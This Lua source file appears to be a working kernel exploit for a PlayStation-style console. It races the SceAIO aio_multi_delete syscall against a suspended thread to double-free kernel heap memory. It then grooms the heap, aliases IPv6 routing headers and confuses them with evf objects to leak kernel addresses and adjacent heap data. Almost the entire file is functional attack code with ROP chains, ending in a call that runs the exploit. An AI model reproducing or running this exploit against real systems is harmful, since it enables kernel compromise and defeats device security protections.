
syscall.resolve({
    unlink = 0xa,

    socket = 0x61,
    connect = 0x62,
    bind = 0x68,
    setsockopt = 0x69,
    listen = 0x6a,
    
    getsockopt = 0x76,
    socketpair = 0x87,
    thr_self = 0x1b0,
    thr_exit = 0x1af,
    sched_yield = 0x14b,
    thr_new = 0x1c7,
    cpuset_getaffinity = 0x1e7,
    cpuset_setaffinity = 0x1e8,
    rtprio_thread = 0x1d2,

    evf_create = 0x21a,
    evf_delete = 0x21b,
    evf_set = 0x220,
    evf_clear = 0x221,

    thr_suspend_ucontext = 0x278,
    thr_resume_ucontext = 0x279,

    aio_multi_delete = 0x296,
    aio_multi_wait = 0x297,
    aio_multi_poll = 0x298,
    aio_multi_cancel = 0x29a,
    aio_submit_cmd = 0x29d,
})




DEBUG = true



-- misc functions

function dbg(s)
    if DEBUG then
        print(s)
    end
end

function dbgf(...)
    if DEBUG then
        dbg(string.format(...))
    end
end






-- cpu related functions

function pin_to_core(core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
end

function get_core_index(mask_addr)
    local num = memory.read_dword(mask_addr):tonumber()
    local position = 0
    while num > 0 do
        num = bit32.rshift(num, 1)
        position = position + 1
    end
    return position - 1
end

function get_current_core()
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    syscall.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(mask)
end

function rtprio(type, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio or 0)  -- current_prio
    syscall.rtprio_thread(type, 0, rtprio):tonumber()
    if type == RTP_LOOKUP then
        return memory.read_word(rtprio + 0x2):tonumber() -- current_prio
    end
end

function set_rtprio(prio)
    rtprio(RTP_SET, prio)
end

function get_rtprio()
    return rtprio(RTP_LOOKUP)
end

-- rop functions

function rop_get_current_core(chain, mask)
    local level = 3
    local which = 1
    local id = -1
    chain:push_syscall(syscall.cpuset_getaffinity, level, which, id, 0x10, mask)
end

function rop_pin_to_core(chain, core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
end

function rop_set_rtprio(chain, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
end




--
-- primitive thread class
--
-- use thr_new to spawn new thread
--
-- only bare syscalls are supported. any attempt to call into few libc 
-- fns (such as printf/puts) will result in a crash
--

prim_thread = {}
prim_thread.__index = prim_thread

function prim_thread.init()

    local setjmp = fcall(libc_addrofs.setjmp)
    local jmpbuf = memory.alloc(0x60)
    
    -- get existing regs state
    setjmp(jmpbuf)

    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)

    prim_thread.initialized = true
end

function prim_thread:prepare_structure()

    local jmpbuf = memory.alloc(0x60)

    -- skeleton jmpbuf
    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr

    -- prep structure for thr_new

    local stack_size = 0x400
    local tls_size = 0x40
    
    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)

    local cpid = memory.alloc(0x8)
    local stack = memory.alloc(stack_size)
    local tls = memory.alloc(tls_size)

    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
    memory.write_qword(self.thr_new_args + 0x10, stack)
    memory.write_qword(self.thr_new_args + 0x18, stack_size)
    memory.write_qword(self.thr_new_args + 0x20, tls)
    memory.write_qword(self.thr_new_args + 0x28, tls_size)
    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid

    self.ready = true
end


function prim_thread:new(chain)

    if not prim_thread.initialized then
        prim_thread.init()
    end

    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    end

    -- exit ropchain once finished
    chain:push_syscall(syscall.thr_exit, 0)

    local self = setmetatable({}, prim_thread)    
    
    self.chain = chain

    return self
end

-- run ropchain in primitive thread
function prim_thread:run()

    if not self.ready then
        self:prepare_structure()
    end

    -- spawn new thread
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error: " .. get_error_string())
    end

    self.ready = false
    self.tid = memory.read_qword(self.tid_addr):tonumber()
    
    return self.tid
end


-- sys/socket.h
AF_UNIX = 1
AF_INET = 2
AF_INET6 = 28
SOCK_STREAM = 1
SOCK_DGRAM = 2
SOL_SOCKET = 0xffff
SO_REUSEADDR = 4
SO_LINGER = 0x80

-- netinet/in.h
IPPROTO_TCP = 6
IPPROTO_UDP = 17
IPPROTO_IPV6 = 41
INADDR_ANY = 0

-- netinet/tcp.h
TCP_INFO = 0x20
size_tcp_info = 0xec

-- netinet/tcp_fsm.h
TCPS_ESTABLISHED = 4

-- netinet6/in6.h
IPV6_2292PKTOPTIONS = 25
IPV6_PKTINFO = 46
IPV6_NEXTHOP = 48
IPV6_RTHDR = 51
IPV6_TCLASS = 61

-- sys/cpuset.h
CPU_LEVEL_WHICH = 3
CPU_WHICH_TID = 1

-- sys/mman.h
MAP_SHARED = 1
MAP_FIXED = 0x10

-- sys/rtprio.h
RTP_SET = 1
RTP_PRIO_REALTIME = 2


--

AIO_CMD_READ = 1
AIO_CMD_WRITE = 2
AIO_CMD_FLAG_MULTI = 0x1000
AIO_CMD_MULTI_READ = bit32.bor(AIO_CMD_FLAG_MULTI, AIO_CMD_READ)
AIO_STATE_COMPLETE = 3
AIO_STATE_ABORTED = 4


MAIN_CORE = 3
MAIN_RTPRIO = 0x100

NUM_WORKERS = 2
NUM_GROOMS = 0x200
NUM_HANDLES = 0x100
NUM_RACES = 100
NUM_SDS = 64 -- TODO: change back to 0x100
NUM_ALIAS = 200
LEAK_LEN = 16
NUM_LEAKS = 5


-- max number of requests that can be created/polled/canceled/deleted/waited
MAX_AIO_IDS = 0x80

-- the various SceAIO syscalls that copies out errors/states will not check if
-- the address is NULL and will return EFAULT. this dummy buffer will serve as
-- the default argument so users don't need to specify one
AIO_ERRORS = memory.alloc(4 * MAX_AIO_IDS)







-- multi aio related functions


-- int aio_submit_cmd(
--     u_int cmd,
--     SceKernelAioRWRequest reqs[],
--     u_int num_reqs,
--     u_int prio,
--     SceKernelAioSubmitId ids[]
-- );
function aio_submit_cmd(cmd, reqs, num_reqs, ids)
    local ret = syscall.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids):tonumber()
    if ret == -1 then
        error("aio_submit_cmd() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_delete(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int sce_errors[]
-- );
function aio_multi_delete(ids, num_ids, states)
    states = states or AIO_ERRORS
    local ret = syscall.aio_multi_delete(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_delete() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_poll(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[]
-- );
function aio_multi_poll(ids, num_ids, states)
    states = states or AIO_ERRORS
    local ret = syscall.aio_multi_poll(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_poll() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_cancel(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[]
-- );
function aio_multi_cancel(ids, num_ids, states)
    states = states or AIO_ERRORS
    local ret = syscall.aio_multi_cancel(ids, num_ids, states):tonumber()
    if ret == -1 then
        error("aio_multi_cancel() error: " .. get_error_string())
    end
    return ret
end

-- int aio_multi_wait(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[],
--     // SCE_KERNEL_AIO_WAIT_*
--     uint32_t mode,
--     useconds_t *timeout
-- );
function aio_multi_wait(ids, num_ids, states, mode, timeout)

    states = states or AIO_ERRORS
    mode = mode or 1
    timeout = timeout or 0

    local ret = syscall.aio_multi_wait(ids, num_ids, states, mode, timeout):tonumber()
    if ret == -1 then
        error("aio_multi_wait() error: " .. get_error_string())
    end
    return ret
end

function new_socket()
    return syscall.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP):tonumber()
end

function new_tcp_socket()
    return syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
end

function gsockopt(sd, level, optname, optval, optlen)
    local size = memory.alloc(8)
    memory.write_dword(size, optlen)
    syscall.getsockopt(sd, level, optname, optval, size)
    return memory.read_dword(size):tonumber()
end

function make_reqs1(num_reqs)
    local reqs1 = memory.alloc(0x28 * num_reqs)
    for i=0,num_reqs-1 do
        memory.write_dword(reqs1 + i*0x28 + 0x20, -1)  -- fd
    end
    return reqs1
end

function spray_aio(loops, reqs1, num_reqs, ids, multi, cmd)
    
    loops = loops or 1
    cmd = cmd or AIO_CMD_READ
    if multi == nil then multi = true end

    local step = 4 * (multi and num_reqs or 1)
    cmd = bit32.bor(cmd, (multi and AIO_CMD_FLAG_MULTI or 0))
    
    for i=0, loops-1 do
        aio_submit_cmd(cmd, reqs1, num_reqs, ids + (i * step))
    end
end

function poll_aio(ids, states, num_ids)
    aio_multi_poll(ids, num_ids, states)
end

function cancel_aios(ids, num_ids)

    local len = MAX_AIO_IDS
    local rem = num_ids % len
    local num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        aio_multi_cancel(ids + (i*4*len), len)
    end

    if rem > 0 then
        aio_multi_cancel(ids + (num_batches*4*len), rem)
    end
end

function free_aios(ids, num_ids, do_cancel)

    if do_cancel == nil then do_cancel = true end

    local len = MAX_AIO_IDS
    local rem = num_ids % len
    local num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        local addr = ids + (i*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        end
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    end

    if rem > 0 then
        local addr = ids + (num_batches*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        end
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    end
end

function free_aios2(ids, num_ids)
    free_aios(ids, num_ids, false)
end



-- exploit related functions

function setup(block_fd)

    -- 1. block AIO

    -- this part will block the worker threads from processing entries so that we may cancel them instead.
    -- this is to work around the fact that aio_worker_entry2() will fdrop() the file associated with the aio_entry on ps5.
    -- we want aio_multi_delete() to call fdrop()

    local reqs1 = memory.alloc(0x28 * NUM_WORKERS)
    local block_id = memory.alloc(4)

    for i=0,NUM_WORKERS-1 do
        memory.write_dword(reqs1 + i*0x28 + 8, 1)  -- nbyte
        memory.write_dword(reqs1 + i*0x28 + 0x20, block_fd)  -- fd
    end

    aio_submit_cmd(AIO_CMD_READ, reqs1, NUM_WORKERS, block_id)

    -- 2. verify if aio can be blocked

    if true then

        local reqs1 = make_reqs1(1)
        local timeout = memory.alloc(4)
        local id = memory.alloc(4)
    
        memory.write_dword(timeout, 1)
    
        aio_submit_cmd(AIO_CMD_READ, reqs1, 1, id)
        syscall.aio_multi_wait(id, 1, AIO_ERRORS, 1, timeout)

        local error_func = fcall(libc_addrofs.error)
        local errno = memory.read_qword(error_func()):tonumber()

        if errno ~= 60 then -- ETIMEDOUT
            error("SceAIO system not blocked. error: " .. get_error_string())
        end

        free_aios(id, 1)
    end

    -- 3. heap grooming

    -- chosen to maximize the number of 0x80 malloc allocs per submission
    local num_reqs = 3
    local groom_ids = memory.alloc(4 * NUM_GROOMS)
    local greqs = make_reqs1(num_reqs)

    -- allocate enough so that we start allocating from a newly created slab
    spray_aio(NUM_GROOMS, greqs, num_reqs, groom_ids, false)
    cancel_aios(groom_ids, NUM_GROOMS)

    return block_id, groom_ids
end


pipe_buf = memory.alloc(8)
ready_signal = memory.alloc(0x8)
deletion_signal = memory.alloc(0x8)

function reset_race_state()
    
    -- clean up race states
    memory.write_qword(ready_signal, 0)
    memory.write_qword(deletion_signal, 0)
end



-- our own sync primitives, as we try to be independant on sony's lk offsets

function wait_for(addr, threshold, do_yield)
    if do_yield == nil then
        do_yield = false
    end
    while memory.read_qword(addr):tonumber() ~= threshold do
        if do_yield == true then
            syscall.sched_yield()
        else
            sleep(1, "ns")
        end
    end
end

-- spin until comparison is false
function rop_wait_for(chain, value_address, op, compare_value)

    local timespec = memory.alloc(0x10)
    memory.write_qword(timespec, 0) -- tv_sec
    memory.write_qword(timespec+8, 1) -- tv_nsec

    chain:gen_loop(value_address, op, compare_value, function()
        chain:push_syscall(syscall.nanosleep, timespec)
    end)
end










function prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)

    local chain = ropchain()

    rop_pin_to_core(chain, MAIN_CORE)
    rop_set_rtprio(chain, MAIN_RTPRIO)

    -- mark thread as ready
    chain:push_write_qword_memory(ready_signal, 1)

    -- wait until it is signalled to start the delete op
    chain:push_syscall(syscall.read, pipe_read_fd, pipe_buf, 1)

    -- do the deletion op
    chain:push_syscall(syscall.aio_multi_delete, request_addr, 1, sce_errs+4)

    -- mark deletion as finished
    chain:push_write_qword_memory(deletion_signal, 1)

    return chain
end


function race_one(request_addr, tcp_sd, sds)

    reset_race_state()

    local sce_errs = memory.alloc(8)
    memory.write_dword(sce_errs, -1)
    memory.write_dword(sce_errs+4, -1)

    local pipe_read_fd, pipe_write_fd = create_pipe()

    -- prepare ropchain to race for aio_multi_delete
    local delete_chain = prepare_aio_multi_delete_rop(request_addr, sce_errs, pipe_read_fd)

    -- NOTE: by using thr_new's based thread, we cant call pthread_* or else the process will crash
    local thr = prim_thread:new(delete_chain)
    local thr_tid = thr:run()

    -- wait for the worker to enter the barrier and sleep
    wait_for(ready_signal, 1)

    local suspend_chain = ropchain()

    suspend_chain:push_syscall(syscall.write, pipe_write_fd, pipe_buf, 1)
    suspend_chain:push_syscall(syscall.sched_yield)
    suspend_chain:push_syscall_with_ret(syscall.thr_suspend_ucontext, thr_tid)
    
    suspend_chain:restore_through_longjmp()
    suspend_chain:execute_through_coroutine()

    local suspend_res = memory.read_qword(suspend_chain.retval_addr[1]):tonumber()

    -- local suspend_res = syscall.thr_suspend_ucontext(thr_tid):tonumber()
    dbgf("suspend %s: %d", hex(thr_tid), suspend_res)

    local poll_err = memory.alloc(4);
    aio_multi_poll(request_addr, 1, poll_err)
    local poll_res = memory.read_dword(poll_err):tonumber()
    dbgf("poll: %s", hex(poll_res))

    local info_buf = memory.alloc(0x100)
    local info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100)

    if info_size ~= size_tcp_info then
        dbgf("info size isn't " .. size_tcp_info .. ": " .. info_size)
    end

    local tcp_state = memory.read_byte(info_buf):tonumber()
    dbg("tcp state: " .. hex(tcp_state))

    local SCE_KERNEL_ERROR_ESRCH = 0x80020003  -- No such process
    
    local won_race = false

    -- to win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if poll_res ~= SCE_KERNEL_ERROR_ESRCH and tcp_state ~= TCPS_ESTABLISHED then
        -- PANIC: double free on the 0x80 malloc zone.
        -- important kernel data may alias
        aio_multi_delete(request_addr, 1, sce_errs)
        won_race = true
    end

    -- resume the worker thread
    local resume = syscall.thr_resume_ucontext(thr_tid):tonumber()
    dbgf("resume %s: %d", hex(thr_tid), resume)

    wait_for(deletion_signal, 1)

    if won_race then

        local err_main_thr = memory.read_dword(sce_errs)
        local err_worker_thr = memory.read_dword(sce_errs+4)
        dbgf("sce_errs: %s %s", hex(err_main_thr), hex(err_worker_thr))

        -- if the code has no bugs then this isn't possible but we keep the check for easier debugging
        -- NOTE: both must be equal 0 for the double free to works
        if err_main_thr ~= err_worker_thr then
            error("bad won")
        end

        -- RESTORE: double freed memory has been reclaimed with harmless data
        -- PANIC: 0x80 malloc zone pointers aliased
        return make_aliased_rthdrs(sds)    
    end

    return nil
end


function build_rthdr(buf, size)

    local len = bit32.band(
        bit32.rshift(size, 3) - 1,
        bit32.bnot(1)
    )
    size = bit32.lshift(len + 1, 3)

    memory.write_byte(buf, 0) -- ip6r_nxt
    memory.write_byte(buf+1, len) -- ip6r_len
    memory.write_byte(buf+2, 0) -- ip6r_type
    memory.write_byte(buf+3, bit32.rshift(len, 1)) -- ip6r_segleft

    return size
end


function get_rthdr(sd, buf, len)
    gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

function set_rthdr(sd, buf, len)
    syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
end

function free_rthdrs(sds)
    for _, sd in ipairs(sds) do
        syscall.setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0)
    end
end


function make_aliased_rthdrs(sds)

    local marker_offset = 4
    local size = 0x80
    local buf = memory.alloc(size)
    local rsize = build_rthdr(buf, size)

    for loop=1,NUM_ALIAS do

        for i=1,NUM_SDS do
            memory.write_dword(buf + marker_offset, i)
            set_rthdr(sds[i], buf, rsize)
        end

        for i=1,NUM_SDS do
            get_rthdr(sds[i], buf, size)
            local marker = memory.read_dword(buf + marker_offset):tonumber()
            -- dbgf("loop[%d] -- sds[%d] = %s", loop, i, hex(marker))
            if marker ~= i then
                local sd_pair = { sds[i], sds[marker] }
                printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
                table.remove(sds, marker)
                table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
                free_rthdrs(sds)
                for i=1,2 do
                    local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
                    table.insert(sds, sock_fd)
                end
                return sd_pair
            end
        end
    end

    errorf("failed to make aliased rthdrs: size %s", hex(size))
end





function double_free_reqs2(sds)

    -- 1. setup socket to wait for soclose

    local function htons(port)
        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
    end

    local function aton(ip)
        local a, b, c, d = ip:match("(%d+).(%d+).(%d+).(%d+)")
        return bit32.bor(bit32.lshift(d, 24), bit32.lshift(c, 16), bit32.lshift(b, 8), a)
    end

    local server_addr = memory.alloc(16)

    memory.write_byte(server_addr + 1, AF_INET) -- sin_family
    memory.write_word(server_addr + 2, htons(5050)) -- sin_port
    memory.write_dword(server_addr + 4, aton("127.0.0.1"))

    local sd_listen = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    if sd_listen == -1 then
        error("socket() error: " .. get_error_string())
    end

    local enable = memory.alloc(4)
    memory.write_dword(enable, 1)

    if syscall.setsockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4):tonumber() == -1 then
        error("setsockopt() error: " .. get_error_string())
    end
    
    if syscall.bind(sd_listen, server_addr, 16):tonumber() == -1 then
        error("bind() error: " .. get_error_string())
    end
 
    if syscall.listen(sd_listen, 1):tonumber() == -1 then
        error("listen() error: " .. get_error_string())
    end

    dbgf("sd_listen: %d", sd_listen)

    -- 2. start the race

    local num_reqs = 3
    local which_req = num_reqs - 1
    local reqs1 = make_reqs1(num_reqs)
    local aio_ids = memory.alloc(4 * num_reqs)
    local req_addr = aio_ids + (4 * which_req)
    local cmd = AIO_CMD_MULTI_READ

    for i=1,NUM_RACES do

        local sd_client = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
        if sd_client == -1 then
            error("socket() error: " .. get_error_string())
        end

        dbgf("sd_client: %d", sd_client)

        if syscall.connect(sd_client, server_addr, 16):tonumber() == -1 then
            error("connect() error: " .. get_error_string())
        end

        local sd_conn = syscall.accept(sd_listen, 0, 0):tonumber()
        if sd_conn == -1 then
            error("accept() error: " .. get_error_string())
        end

        dbgf("sd_conn: %d", sd_conn)

        local linger_buf = memory.alloc(8)
        memory.write_dword(linger_buf, 1) -- l_onoff - linger active
        memory.write_dword(linger_buf+4, 1) -- l_linger - how many seconds to linger for

        -- force soclose() to sleep
        if syscall.setsockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8):tonumber() == -1 then
            error("setsockopt() error: " .. get_error_string())
        end

        memory.write_dword(reqs1 + which_req*0x28 + 0x20, sd_client)

        aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids)
        aio_multi_cancel(aio_ids, num_reqs)
        aio_multi_poll(aio_ids, num_reqs)

        -- drop the reference so that aio_multi_delete() will trigger _fdrop()
        syscall.close(sd_client)

        local res = race_one(req_addr, sd_conn, sds)

        -- MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
        -- twice. this will leave one request undeleted
        aio_multi_delete(aio_ids, num_reqs)
        syscall.close(sd_conn)

        if res then
            printf("won race at attempt %d", i)
            syscall.close(sd_listen)
            return res
        end
    end

    error("failed aio double free")
end



function new_evf(name, flags)
    local ret = syscall.evf_create(name, 0, flags):tonumber()
    if ret == -1 then
        error("evf_create() error: " .. get_error_string())
    end
    return ret
end

function set_evf_flags(id, flags)
    if syscall.evf_clear(id, 0):tonumber() == -1 then
        error("evf_clear() error: " .. get_error_string())
    end
    if syscall.evf_set(id, flags):tonumber() == -1 then
        error("evf_set() error: " .. get_error_string())
    end
end

function free_evf(id)
    if syscall.evf_delete(id):tonumber() == -1 then
        error("evf_delete() error: " .. get_error_string())
    end
end



function verify_reqs2(buf, offset)

    -- reqs2.ar2_cmd
    if memory.read_dword(buf + offset):tonumber() ~= AIO_CMD_WRITE then
        return false
    end

    -- check reqs2.ar2_result.state
    -- state is actually a 32-bit value but the allocated memory was initialized with zeros.
    -- all padding bytes must be 0 then
    local state1 = memory.read_dword(buf + offset + 0x38):tonumber()
    local state2 = memory.read_dword(buf + offset + 0x38 + 4):tonumber()
    if not (state1 > 0 and state2 <= 4) or state2 ~= 0 then
        return false
    end

    -- reqs2.ar2_file must be NULL since we passed a bad file descriptor to aio_submit_cmd()
    if memory.read_qword(buf + offset + 0x40) ~= uint64(0) then
        return false
    end

    local kernel_addr_offset = {0x10, 0x18, 0x20, 0x48, 0x50}
    for _, addr_offset in ipairs(kernel_addr_offset) do
        local prefix = memory.read_word(buf + offset + addr_offset + 6):tonumber()
        if prefix ~= 0xffff then
            return false
        end
    end

    return true
end



function leak_kernel_addrs(sd_pair)

    local sd = sd_pair[1]
    local buflen = 0x80 * LEAK_LEN
    local buf = memory.alloc(buflen)

    -- type confuse a struct evf with a struct ip6_rthdr.
    -- the flags of the evf must be set to >= 0xf00 in order to fully leak the contents of the rthdr
    print("confuse evf with rthdr")

    local name = memory.alloc(1)

    -- free one of rthdr
    syscall.close(sd_pair[2])

    local evf = nil
    for i=1, NUM_ALIAS do

        local evfs = {}

        -- reclaim freed rthdr with evf object
        for j=1, NUM_HANDLES do
            local evf_flags = bit32.bor(0xf00, bit32.lshift(j, 16))
            table.insert(evfs, new_evf(name, evf_flags))
        end

        get_rthdr(sd, buf, 0x80)

        -- for simplicty, we'll assume i < 2**16
        local flag = memory.read_dword(buf):tonumber()

        if bit32.band(flag, 0xf00) == 0xf00 then

            local idx = bit32.rshift(flag, 16) 
            local expected_flag = bit32.bor(flag, 1)
            
            evf = evfs[idx]

            set_evf_flags(evf, expected_flag)
            get_rthdr(sd, buf, 0x80)

            local val = memory.read_dword(buf):tonumber()
            if val == expected_flag then
                table.remove(evfs, idx)
            else
                evf = nil
            end
        
        end

        for _, each_evf in ipairs(evfs) do
            free_evf(each_evf)
        end

        if evf ~= nil then
            printf("confused rthdr and evf at attempt: %d", i)
            break
        end
    end

    if evf == nil then
        error("failed to confuse evf and rthdr")
    end

    -- ip6_rthdr and evf structure are overlapped by now
    -- enlarge ip6_rthdr by writing to its len field by setting the evf's flag
    set_evf_flags(evf, bit32.lshift(0xff, 8))

    -- fields we use from evf (number before the field is the offset in hex):
    -- struct evf:
    --     0 u64 flags
    --     28 struct cv cv
    --     38 TAILQ_HEAD(struct evf_waiter) waiters

    -- evf.cv.cv_description = "evf cv"
    -- string is located at the kernel's mapped ELF file
    local kernel_addr = memory.read_qword(buf + 0x28)
    printf("\"evf cv\" string addr: %s", hex(kernel_addr))

    -- because of TAILQ_INIT(), we have:
    --
    -- evf.waiters.tqh_last == &evf.waiters.tqh_first
    --
    -- we now know the address of the kernel buffer we are leaking
    local kbuf_addr = memory.read_qword(buf + 0x40) - 0x38
    printf("kernel buffer addr: %s", hex(kbuf_addr))

    -- 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
    -- allocate reqs1 arrays at 0x100 malloc zone
    local num_elems = 6

    -- use reqs1 to fake a aio_info.
    -- set .ai_cred (offset 0x10) to offset 4 of the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket field
    local ucred = kbuf_addr + 4
    local leak_reqs = make_reqs1(num_elems)
    memory.write_qword(leak_reqs + 0x10, ucred)

    local leak_ids_len = NUM_HANDLES * num_elems
    local leak_ids = memory.alloc(4 * leak_ids_len)

    local function get_reqs2_offset()
        for i=1, NUM_LEAKS do
            
            spray_aio(NUM_HANDLES, leak_reqs, num_elems, leak_ids, true, AIO_CMD_WRITE)        
            
            -- read out-of-bound for adjacent reqs2
            get_rthdr(sd, buf, buflen)

            for off=0x80, buflen-1, 0x80 do
                if verify_reqs2(buf, off) then
                    printf("found reqs2 at attempt: %d", i)
                    return off
                end
            end
            
            free_aios(leak_ids, leak_ids_len)
        end
        return nil
    end

    local reqs2_off = get_reqs2_offset()
    if reqs2_off == nil then
        error("could not leak a reqs2")
    end

    dbgf("reqs2 offset: %s", hex(reqs2_off))

    get_rthdr(sd, buf, buflen)

    dbg("leaked aio_entry:")
    dbg(memory.hex_dump(buf + reqs2_off, 0x80))

    local reqs1_addr = memory.read_qword(buf + reqs2_off + 0x10)
    -- dbgf("reqs1_addr = %s", hex(reqs1_addr))
    reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))
    printf("reqs1_addr = %s", hex(reqs1_addr))

    dbg("searching target_id")

    local target_id = nil
    local to_cancel = nil
    local to_cancel_len = nil

    for i=0, leak_ids_len-1, num_elems do

        aio_multi_cancel(leak_ids + i*4, num_elems)
        get_rthdr(sd, buf, buflen)

        local state = memory.read_dword(buf + reqs2_off + 0x38):tonumber()
        if state == AIO_STATE_ABORTED then
            
            target_id = memory.read_dword(leak_ids + i*4):tonumber()
            printf("found target_id=%s, i=%d, batch=%d", hex(target_id), i, i / num_elems)
            
            local start = i + num_elems
            to_cancel = leak_ids + start*4
            to_cancel_len = leak_ids_len - start
            
            break
        end
    end

    if target_id == nil then
        error("target id not found")
    end

    cancel_aios(to_cancel, to_cancel_len)
    free_aios2(leak_ids, leak_ids_len)

    return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
end




function kexploit()

    -- pin to 1 core so that we only use 1 per-cpu bucket.
    -- this will make heap spraying and grooming easier
    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)

    printf("pinning to core %d with prio %d", get_current_core(), get_rtprio())

    local sockpair = memory.alloc(8)
    local sds = {}

    if syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair):tonumber() == -1 then
        error("socketpair() error: " .. get_error_string())
    end

    local block_fd = memory.read_dword(sockpair):tonumber()
    local unblock_fd = memory.read_dword(sockpair + 4):tonumber()

    dbgf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)

    -- NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
    for i=1,NUM_SDS do
        local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
        table.insert(sds, sock_fd)
    end

    local block_id, groom_ids = nil, nil

    -- catch lua error so we can do clean up
    local err = run_with_coroutine(function()

        print("\n[+] Setup\n")
        block_id, groom_ids = setup(block_fd)

        print("\n[+] Double-free AIO\n")
        local sd_pair = double_free_reqs2(sds)

        print("\n[+] Leak kernel addresses\n")
        local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf
            = leak_kernel_addrs(sd_pair)
    
    end)

    if err then
        print(err)
    end

    -- clean up

    syscall.close(block_fd)
    syscall.close(unblock_fd)

    if groom_ids then
        free_aios2(groom_ids, NUM_GROOMS)
    end

    if block_id then
        aio_multi_wait(block_id, 1)
        aio_multi_delete(block_id, 1)
    end

    for _, sd in ipairs(sds) do
        syscall.close(sd)
    end
end


kexploit()

